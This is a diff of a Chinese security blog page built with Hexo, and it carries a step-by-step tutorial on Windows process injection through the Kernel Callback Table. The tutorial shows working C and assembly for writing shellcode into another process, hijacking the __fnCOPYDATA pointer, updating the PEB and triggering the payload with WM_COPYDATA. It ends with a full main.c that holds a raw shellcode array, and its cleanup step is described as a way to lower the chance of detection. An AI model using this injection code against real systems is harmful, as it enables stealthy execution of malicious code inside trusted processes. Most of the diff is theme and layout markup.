 <h3 id="第-8-步-为有效负载分配内存"><a href="#第-8-步-为有效负载分配内存" class="headerlink" title="第 8 步 - 为有效负载分配内存"></a>第 8 步 - 为有效负载分配内存</h3><p>有效负载（通常是 shellcode）在目标进程的内存空间内分配。内存标记为 executable 以确保代码可以运行。</p>
-<pre><code>unsigned char my_payload[] = &quot;...&quot;; 
+<pre><code class="hljs">unsigned char my_payload[] = &quot;...&quot;; 
 SIZE_T shellcodeSize = sizeof( my_payload );
 
 LPVOID remotebuf = VirtualAllocEx( hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE
@@ -446,7 +523,7 @@ printf( &quot;[+] Payload written to remote buffer at: 0x%p\n&quot;, remotebuf )
 <li>WriteProcessMemory 将 shellcode 写入分配的空间，使其能够在触发时运行。</li>
 </ul>
 <h3 id="第-9-步-修改内核回调表"><a href="#第-9-步-修改内核回调表" class="headerlink" title="第 9 步 - 修改内核回调表"></a>第 9 步 - 修改内核回调表</h3><p>通过将 __fnCOPYDATA 指针重定向到注入的负载来修改 Kernel Callback Table。这使得 Windows 在 WM_COPYDATA 消息期间调用有效负载。</p>
-<pre><code>KERNELCALLBACKTABLE cKCT;
+<pre><code class="hljs">KERNELCALLBACKTABLE cKCT;
 if ( !ReadProcessMemory( hProcess, KernelCallbackTable, &amp;cKCT, sizeof( cKCT ), &amp;bytesRead ) ) &#123;
     printf( &quot;[-] Failed to read existing KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
     return -1;
@@ -464,7 +541,7 @@ if ( !clonedcKCT || !WriteProcessMemory( hProcess, clonedcKCT, &amp;cKCT, sizeof
 <li>ReadProcessMemory 检索 Kernel Callback Table 结构。__fnCOPYDATA 字段将重定向以指向有效负载，从而在WM_COPYDATA消息接收时启用其执行。</li>
 </ul>
 <h3 id="第-10-步-使用修改后的表更新-PEB"><a href="#第-10-步-使用修改后的表更新-PEB" class="headerlink" title="第 10 步 - 使用修改后的表更新 PEB"></a>第 10 步 - 使用修改后的表更新 PEB</h3><p>更改后的内核回调表将写入 PEB，确保 Windows 引用此修改后的版本。</p>
-<pre><code>if ( !WriteProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;clonedcKCT, sizeof( PVOID ), &amp;bytesRead ) ) &#123;
+<pre><code class="hljs">if ( !WriteProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;clonedcKCT, sizeof( PVOID ), &amp;bytesRead ) ) &#123;
     printf( &quot;[-] Failed to update PEB KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
     return -1;
 &#125;
@@ -475,7 +552,7 @@ printf( &quot;[+] PEB KernelCallbackTable updated successfully!\n&quot; );
 <li>WriteProcessMemory 将修改后的表写入 PEB，使更改的回调结构处于活动状态，以准备触发有效负载。</li>
 </ul>
 <h3 id="第-11-步-触发-Payload"><a href="#第-11-步-触发-Payload" class="headerlink" title="第 11 步 - 触发 Payload"></a>第 11 步 - 触发 Payload</h3><p>该代码发送一条 WM_COPYDATA 消息，该消息激活 Kernel Callback Table 中的 __fnCOPYDATA 函数，并执行有效负载。</p>
-<pre><code>COPYDATASTRUCT cds;
+<pre><code class="hljs">COPYDATASTRUCT cds;
 WCHAR msg[] = L&quot;trigger&quot;;
 cds.dwData = 1;
 cds.cbData = ( lstrlenW( msg ) + 1 ) * sizeof( WCHAR );
@@ -489,7 +566,7 @@ if ( result == 0 &amp;&amp; GetLastError() != 0 ) &#123;
 printf( &quot;[+] Payload triggered!\n&quot; );
 </code></pre>
 <h3 id="第-12-步-清理"><a href="#第-12-步-清理" class="headerlink" title="第 12 步 - 清理"></a>第 12 步 - 清理</h3><p>最后，释放内存分配并关闭处理，确保干净退出并最大限度地降低检测风险。</p>
-<pre><code>VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );
+<pre><code class="hljs">VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );
 VirtualFreeEx( hProcess, clonedcKCT, 0, MEM_RELEASE );
 CloseHandle( hProcess );
 CloseHandle( pi.hProcess );
@@ -500,19 +577,19 @@ printf( &quot;[+] Cleanup completed successfully.\n&quot; );
 <hr>
 <h2 id="帮助程序程序集代码"><a href="#帮助程序程序集代码" class="headerlink" title="帮助程序程序集代码"></a>帮助程序程序集代码</h2><p>为了增强注入过程，我们使用了 helper.asm 中定义的一些汇编函数。这些函数帮助我们找到 PEB 并更有效地操作 Kernel Callback Table。</p>
 <h3 id="定位PEB"><a href="#定位PEB" class="headerlink" title="定位PEB"></a>定位PEB</h3><p>此函数通过访问 gs 段寄存器来检索当前进程的 PEB 地址，该寄存器指向 x64 体系结构中的线程信息块 （TIB）。</p>
-<pre><code>LocatePEB PROC
+<pre><code class="hljs">LocatePEB PROC
     mov rax, qword ptr gs:[60h] ; Access PEB in x64
     ret
 LocatePEB ENDP
 </code></pre>
 <h3 id="UnhingCallbackTable"><a href="#UnhingCallbackTable" class="headerlink" title="UnhingCallbackTable"></a>UnhingCallbackTable</h3><p>给定 RCX 寄存器中的 PEB 地址，此函数通过访问 PEB 结构中偏移量为 0x58 的内存来检索内核回调表的地址。</p>
-<pre><code>ResolveKernelCallbackTable PROC
+<pre><code class="hljs">ResolveKernelCallbackTable PROC
     mov rax, qword ptr [rcx + 58h] ; Offset for KernelCallbackTable in PEB (0x58)
     ret
 ResolveKernelCallbackTable ENDP
 </code></pre>
 <h3 id="写入内核回调表"><a href="#写入内核回调表" class="headerlink" title="写入内核回调表"></a>写入内核回调表</h3><p>该函数通过向指定的偏移量写入新地址来更新 PEB 中的 Kernel Callback Table 地址。</p>
-<pre><code>WriteKernelCallbackTable PROC
+<pre><code class="hljs">WriteKernelCallbackTable PROC
     mov qword ptr [rcx + 58h], rdx    ; Write the new KernelCallbackTable address
     ret
 WriteKernelCallbackTable ENDP
@@ -520,7 +597,7 @@ WriteKernelCallbackTable ENDP
 <p>这些汇编函数简化了与 PEB 和内核回调表交互的过程，使我们的 C++ 代码更简洁、更高效。</p>
 <hr>
 <h2 id="把它们放在一起！"><a href="#把它们放在一起！" class="headerlink" title="把它们放在一起！"></a>把它们放在一起！</h2><p>main.c</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre><code class="hljs">#include &lt;stdio.h&gt;
 #include &lt;windows.h&gt;
 #include &quot;struct.h&quot;
 #include &quot;helper.h&quot;
@@ -564,7 +641,7 @@ void EnableDebugPrivilege()
 &#125;
 </code></pre>
 <p>​    </p>
-<pre><code>unsigned char payload[] = &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00&quot;;
+<pre><code class="hljs">unsigned char payload[] = &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00&quot;;
 SIZE_T shellcodeSize = sizeof( payload ) - 1;
 SIZE_T bytesRead = 0;
 
@@ -852,425 +929,354 @@ int main()
 <hr>
 <p>最后，感谢您的阅读！</p>
 
-      </div>
-      
-        <div class="prev-or-next">
-          <div class="post-foot-next">
-            
-              <a href="/2024/11/05/%E4%BF%84%E7%BD%97%E6%96%AFAPT%E7%BB%84%E7%BB%87%E6%8A%80%E6%88%98%E6%9C%AF%E6%83%85%E6%8A%A5/" target="_self">
-                <i class="iconfont icon-chevronleft"></i>
-                <span>Prev</span>
-              </a>
-            
-          </div>
-          <div class="post-attach">
-            <span class="post-pubtime">
-              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2025-01-22 17:20:56
-            </span>
-            
-                  <span class="post-tags">
-                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" title="主机安全">
-                        #主机安全
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="进程注入">
-                        #进程注入
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-          </div>
-          <div class="post-foot-prev">
-            
-              <a href="/2024/12/02/%E4%BC%AA%E9%80%A0%E8%B0%83%E7%94%A8%E6%A0%88%E6%9D%A5%E8%BF%B7%E6%83%91EDR%E5%92%8C%E6%9D%80%E8%BD%AF/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-    </div>
-    
-  <div id="btn-catalog" class="btn-catalog">
-    <i class="iconfont icon-catalog"></i>
-  </div>
-  <div class="post-catalog hidden" id="catalog">
-    <div class="title">Contents</div>
-    <div class="catalog-content">
-      
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-PoC"><span class="toc-text">参考 PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E8%BF%87%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97-%EF%BC%88PEB%EF%BC%89"><span class="toc-text">了解过程环境块 （PEB）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8"><span class="toc-text">浏览内核回调表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%92%8C%E5%88%86%E6%9E%90%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8"><span class="toc-text">查找和分析内核回调表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE-PEB-%E5%92%8C%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8"><span class="toc-text">查找 PEB 和内核回调表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-Kernel-Callback-Table-%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-text">分析 Kernel Callback Table 中的函数指针</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E6%93%8D%E4%BD%9C%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">通过内核回调表操作进行进程注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1-%E5%90%AF%E7%94%A8%E8%B0%83%E8%AF%95%E6%9D%83%E9%99%90"><span class="toc-text">步骤 1 - 启用调试权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2-%E5%8A%A0%E8%BD%BD-NtQueryInformationProcess"><span class="toc-text">步骤 2 - 加载 NtQueryInformationProcess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3-%E2%80%94-%E5%90%AF%E5%8A%A8-Target-%E6%B5%81%E7%A8%8B"><span class="toc-text">步骤 3 — 启动 Target 流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-4-%E6%AD%A5-%E2%80%94-%E6%89%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E7%AA%97%E5%8F%A3%E5%92%8C%E8%BF%9B%E7%A8%8B-ID"><span class="toc-text">第 4 步 — 找到目标窗口和进程 ID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-5-%E6%AD%A5-%E6%89%93%E5%BC%80%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%8F%A5%E6%9F%84"><span class="toc-text">第 5 步 - 打开目标进程的句柄</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-6-%E6%A3%80%E7%B4%A2-PEB-%E5%9C%B0%E5%9D%80"><span class="toc-text">步骤 6 - 检索 PEB 地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-7-%E6%AD%A5-%E8%AF%BB%E5%8F%96%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8"><span class="toc-text">第 7 步 - 读取内核回调表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-8-%E6%AD%A5-%E4%B8%BA%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98"><span class="toc-text">第 8 步 - 为有效负载分配内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-9-%E6%AD%A5-%E4%BF%AE%E6%94%B9%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8"><span class="toc-text">第 9 步 - 修改内核回调表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-10-%E6%AD%A5-%E4%BD%BF%E7%94%A8%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E8%A1%A8%E6%9B%B4%E6%96%B0-PEB"><span class="toc-text">第 10 步 - 使用修改后的表更新 PEB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-11-%E6%AD%A5-%E8%A7%A6%E5%8F%91-Payload"><span class="toc-text">第 11 步 - 触发 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-12-%E6%AD%A5-%E6%B8%85%E7%90%86"><span class="toc-text">第 12 步 - 清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%AE%E5%8A%A9%E7%A8%8B%E5%BA%8F%E7%A8%8B%E5%BA%8F%E9%9B%86%E4%BB%A3%E7%A0%81"><span class="toc-text">帮助程序程序集代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8DPEB"><span class="toc-text">定位PEB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnhingCallbackTable"><span class="toc-text">UnhingCallbackTable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8"><span class="toc-text">写入内核回调表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%8A%E5%AE%83%E4%BB%AC%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7%EF%BC%81"><span class="toc-text">把它们放在一起！</span></a></li></ol>
-      
-    </div>
-  </div>
-
-  
-<script src="/js/catalog.js"></script>
-
-
-
-
-    
-      <div class="comments-container">
-        
-
-
-
-
-  
-    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
-  
-
-  <div id="vcomments"></div>
-
-  <script>
-    function loadValineSuc() {
-      new Valine({
-        el: '#vcomments',
-        appId: 'ceAjSe00zC64FzvGqcpmcNMN-gzGzoHsz',
-        appKey: 'OjjBzWRjoxlhtVeii08I5cxA',
-        placeholder: 'Welcome!',
-        avatar: 'retro',
-        lang: 'en'
-      })
-    }
-  </script>
-
-    <style>
-      .comments-container .v .vempty {
-        display: none!important;
-      }
-    </style>
-
-
-
-
-      </div>
-    
-  </div>
-
-
-        
-  <div class="footer">
-    <div class="social">
-      <ul>
-        
-          <li>
-            
-                <a title="github" target="_blank" rel="noopener" href="https://github.com/Hipepper/">
-                  <i class="iconfont icon-github"></i>
-                </a>
                 
-          </li>
-          
-          <li>
+              </div>
             
-                <a title="rss" href="/atom.xml">
-                  <i class="iconfont icon-rss"></i>
-                </a>
-                
-          </li>
-          
-      </ul>
-    </div>
-    
-      
-        <div class="footer-more">
-          
-            <a target="_blank" rel="noopener" href="https://github.com/Hipepper/">Copyright © 2025 TIP Factory</a>
-            
-        </div>
-        
-      
-        <div class="footer-more">
-          
-            <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Tip Factory | JentleTao</a>
-            
-        </div>
-        
-          
-            <div class="footer-views">
-              
-                本站总访问量<span id="busuanzi_value_site_pv"></span>次
-                    
-                      
-                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
-                    
-                      
-                本站访客数<span id="busuanzi_value_site_uv"></span>人
-                    
-                      
-            </div>
-            
-  </div>
-
-
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
   
-    <script src="https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js"></script>
-    <script>
-      mermaid.initialize({
-        theme: 'default',
-        startOnLoad: true,
-        flowchart: { useMaxWidth: false }
-      });
-    </script>
-    
-      </div>
-
-      <div class="tools-bar">
-        <div class="back-to-top tools-bar-item hidden">
-  <a href="javascript: void(0)">
-    <i class="iconfont icon-chevronup"></i>
-  </a>
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" class="print-no-link">#主机安全</a>
+      
+        <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" class="print-no-link">#进程注入</a>
+      
+    </div>
+  
 </div>
 
 
-<script src="/js/backtotop.js"></script>
+              
+  
 
-
-
-        
-  <div class="search-icon tools-bar-item" id="search-icon">
-    <a href="javascript: void(0)">
-      <i class="iconfont icon-search"></i>
-    </a>
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>使用内核回调表进程注入</div>
+      <div>http://example.com/2024/11/12/使用内核回调表进程注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Jentle</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 12, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
   </div>
 
-  <div class="search-overlay hidden">
-    <div class="search-content" tabindex="0">
-      <div class="search-title">
-        <span class="search-icon-input">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-search"></i>
-          </a>
-        </span>
-        
-          <input type="text" class="search-input" id="search-input" placeholder="Search...">
-        
-        <span class="search-close-icon" id="search-close-icon">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-close"></i>
-          </a>
-        </span>
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/02/%E4%BC%AA%E9%80%A0%E8%B0%83%E7%94%A8%E6%A0%88%E6%9D%A5%E8%BF%B7%E6%83%91EDR%E5%92%8C%E6%9D%80%E8%BD%AF/" title="伪造调用栈来迷惑EDR和杀软">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">伪造调用栈来迷惑EDR和杀软</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/05/%E4%BF%84%E7%BD%97%E6%96%AFAPT%E7%BB%84%E7%BB%87%E6%8A%80%E6%88%98%E6%9C%AF%E6%83%85%E6%8A%A5/" title="俄罗斯APT组织技战术情报">
+                        <span class="hidden-mobile">俄罗斯APT组织技战术情报</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-      <div class="search-result" id="search-result"></div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
     </div>
   </div>
+</div>
 
-  <script type="text/javascript">
-    var inputArea = document.querySelector("#search-input")
-    var searchOverlayArea = document.querySelector(".search-overlay")
 
-    inputArea.onclick = function() {
-      getSearchFile()
-      this.onclick = null
-    }
 
-    inputArea.onkeydown = function() {
-      if(event.keyCode == 13)
-        return false
-    }
 
-    function openOrHideSearchContent() {
-      let isHidden = searchOverlayArea.classList.contains('hidden')
-      if (isHidden) {
-        searchOverlayArea.classList.remove('hidden')
-        document.body.classList.add('hidden')
-        // inputArea.focus()
-      } else {
-        searchOverlayArea.classList.add('hidden')
-        document.body.classList.remove('hidden')
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
-    }
-
-    function blurSearchContent(e) {
-      if (e.target === searchOverlayArea) {
-        openOrHideSearchContent()
-      }
-    }
-
-    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
-    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
-    searchOverlayArea.addEventListener("click", blurSearchContent, false)
-
-    var searchFunc = function (path, search_id, content_id) {
-      'use strict';
-      var $input = document.getElementById(search_id);
-      var $resultContent = document.getElementById(content_id);
-      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
-      $.ajax({
-        // 0x01. load xml file
-        url: path,
-        dataType: "xml",
-        success: function (xmlResponse) {
-          // 0x02. parse xml file
-          var datas = $("entry", xmlResponse).map(function () {
-            return {
-              title: $("title", this).text(),
-              content: $("content", this).text(),
-              url: $("url", this).text()
-            };
-          }).get();
-          $resultContent.innerHTML = "";
-
-          $input.addEventListener('input', function () {
-            // 0x03. parse query to keywords list
-            var str = '<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length <= 0) {
-              return;
-            }
-            // 0x04. perform local searching
-            datas.forEach(function (data) {
-              var isMatch = true;
-              var content_index = [];
-              if (!data.title || data.title.trim() === '') {
-                data.title = "Untitled";
-              }
-              var orig_data_title = data.title.trim();
-              var data_title = orig_data_title.toLowerCase();
-              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
-              var data_content = orig_data_content.toLowerCase();
-              var data_url = data.url;
-              var index_title = -1;
-              var index_content = -1;
-              var first_occur = -1;
-              // only match artiles with not empty contents
-              if (data_content !== '') {
-                keywords.forEach(function (keyword, i) {
-                  index_title = data_title.indexOf(keyword);
-                  index_content = data_content.indexOf(keyword);
-
-                  if (index_title < 0 && index_content < 0) {
-                    isMatch = false;
-                  } else {
-                    if (index_content < 0) {
-                      index_content = 0;
-                    }
-                    if (i == 0) {
-                      first_occur = index_content;
-                    }
-                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
-                  }
-                });
-              } else {
-                isMatch = false;
-              }
-              // 0x05. show search results
-              if (isMatch) {
-                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
-                var content = orig_data_content;
-                if (first_occur >= 0) {
-                  // cut out 100 characters
-                  var start = first_occur - 20;
-                  var end = first_occur + 80;
-
-                  if (start < 0) {
-                    start = 0;
-                  }
-
-                  if (start == 0) {
-                    end = 100;
-                  }
-
-                  if (end > content.length) {
-                    end = content.length;
-                  }
-
-                  var match_content = content.substr(start, end);
-
-                  // highlight all keywords
-                  keywords.forEach(function (keyword) {
-                    var regS = new RegExp(keyword, "gi");
-                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
-                  });
-
